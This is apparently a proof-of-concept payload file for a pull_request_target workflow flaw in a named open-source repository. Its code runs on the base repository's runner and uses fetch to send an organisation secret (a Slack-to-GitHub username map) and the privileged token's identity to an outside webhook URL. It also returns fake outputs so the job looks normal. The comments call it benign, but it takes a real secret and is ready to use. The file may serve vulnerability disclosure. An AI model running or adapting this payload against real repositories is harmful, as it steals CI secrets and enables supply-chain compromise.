/**
 * count_user_reviewable_prs.js â€” PoC payload for WordPress/openverse
 * .github/workflows/pr_limit_reminders.yml (analyze-user-prs job)
 *
 * This file REPLACES the legitimate module in the attacker's fork. Because the
 * workflow runs on `pull_request_target` and does an unguarded
 * `actions/checkout@v4` (PR head) + `require('./automations/js/src/count_user_reviewable_prs.js')`
 * inside `actions/github-script@v7` provisioned with `secrets.ACCESS_TOKEN`,
 * THIS code executes on the base repo's runner with:
 *   1. the `github` API client bound to `secrets.ACCESS_TOKEN`
 *   2. `process.env.GH_SLACK_USERNAME_MAP` (org member Slack<->GitHub mapping)
 *
 * The payload is deliberately demonstrative and benign:
 *   - it only reaches YOUR listener (replace https://webhook.site/0568eb0d-3eb6-4616-a32a-1b25f1fcf42e),
 *   - it proves code execution, secret access, and token bindings,
 *   - it performs NO writes, no dispatch, no destructive action.
 *
 * Exploit script: exploit.ps1 (goes there after fork / before PR)
 */
module.exports = async ({ github, context, core }) => {
  const CALLBACK = 'https://webhook.site/0568eb0d-3eb6-4616-a32a-1b25f1fcf42e';

  // 1) Arbitrary code execution on the base-repo runner.
  await fetch(`${CALLBACK}?stage=exec&payload=` +
    encodeURIComponent('count_user_reviewable_prs.js executed on openverse runner'));

  // 2) Proof of secret access: Slack<->GitHub mapping secret.
  await fetch(`${CALLBACK}?stage=secret&map=` +
    encodeURIComponent(process.env.GH_SLACK_USERNAME_MAP || '(empty)'));

  // 3) Prove the API client is the privileged ACCESS_TOKEN (read-only proof).
  try {
    const me = await github.rest.users.getAuthenticated();
    await fetch(`${CALLBACK}?stage=token&user=${encodeURIComponent(me.data.login)}` +
      `&repo=${encodeURIComponent(context.repo.repo)}` +
      `&owner=${encodeURIComponent(context.repo.owner)}`);
  } catch (e) {
    await fetch(`${CALLBACK}?stage=token_error&msg=${encodeURIComponent(String(e))}`);
  }

  // Preserve the job's output contract so the sibling `send_message` job is unaffected.
  return { pr_count: 6, slack_id: 'poc-tester', should_alert: true };
};